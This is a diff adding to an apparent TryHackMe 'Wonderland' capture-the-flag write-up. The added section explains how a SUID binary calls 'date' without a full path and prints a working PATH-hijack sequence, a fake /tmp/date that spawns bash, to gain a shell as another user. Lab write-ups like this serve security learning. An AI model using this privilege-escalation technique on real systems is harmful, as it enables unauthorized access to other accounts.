@@ -1,5 +1,5 @@
 ---
-{"dg-publish":true,"permalink":"/try-hack-me-rooms/wonderland/","tags":["tryhackme","offensivesecurity","ethicalhacking","wonderland","steganography","suid","suid-binaries","ssh"],"created":"2026-04-06T13:26:22.348+02:00","updated":"2026-04-06T16:50:24.249+02:00","dg-note-properties":{"tags":["tryhackme","offensivesecurity","ethicalhacking","wonderland","steganography","suid","suid-binaries","ssh"]}}
+{"dg-publish":true,"permalink":"/try-hack-me-rooms/wonderland/","tags":["tryhackme","offensivesecurity","ethicalhacking","wonderland","steganography","suid","suid-binaries","ssh"],"created":"2026-04-06T13:26:22.348+02:00","updated":"2026-04-06T21:08:12.500+02:00","dg-note-properties":{"tags":["tryhackme","offensivesecurity","ethicalhacking","wonderland","steganography","suid","suid-binaries","ssh"]}}
 ---
 
 ![](/img/user/Attachments/wonderland.png)
@@ -139,6 +139,56 @@ pty.spawn("/bin/bash")
 
 Sure enough the shell to **rabbit** is a success.
 
+So there is a file called `teaParty` in rabbit's home directory. Running it results in a boring output but reveals clues. 
+
+```
+Welcome to the tea party!
+The Mad Hatter will be here soon.
+Probably by Mon, 06 Apr 2026 19:38:45 +0000
+```
+
+One can argue that the theme is about Hatter and that the time formatted string perhaps calls the `date` binary. Since SUID-binaries already have been exploited due to lack of use of the full path. Perhaps `date` is also being called with a relative path. 
+
+`cat -v /home/rabbit/teaParty | grep -a "date\|Hatter\|tea\|bin"`
+
+Looking for anything useful with a less effective method since `Strings` is not available. Not much is revealed much is just gibberish.
+
+**Breakdown of the Command**
+	-v makes non-printable characters readable
+	-a tells grep to treat binary as text 
+	\ |is the logical OR operator for grep (regex mode)
+
+**-v flag**
+Normally binary files contain bytes outside the printable ASCII range (0-127). When cat tries to print these the terminal shows garbled symbols or nothing at all. `-v` converts non-printable bytes to visible representations:
+
+**\| operator**
+The backslash is only needed in basic regex mode. With `-E` flag you can use `|` directly without backslash. Both do the same thing.
+
+
+```
+# write a spawning shell to the date file
+echo '/bin/bash' > /tmp/date
+
+# make it executable 
+chmod +x /tmp/date
+
+# add the /tmp path to $PATH
+export PATH=/tmp:$PATH
+
+# execute 
+/home/rabbit/teaParty
+```
+
+**The Exploit**
+Let's assume the date binary is vulnerable and exploit it. Writing a bash shell to the date binary, making it executable and finally adding it to $PATH. 
+
+**Hatter shell**
+The teaParty file talks about Hatter. Perhaps the theme revolves around him. One can assume that the next target is Hatter and thus to target a binary which is either run by or owned by Hatter.
+
+
+![](/img/user/Attachments/hatter-shell.png)
+
+Sure enough a shell as **hatter** spawns. So it is a success. 
 
 ## Pwnage
 
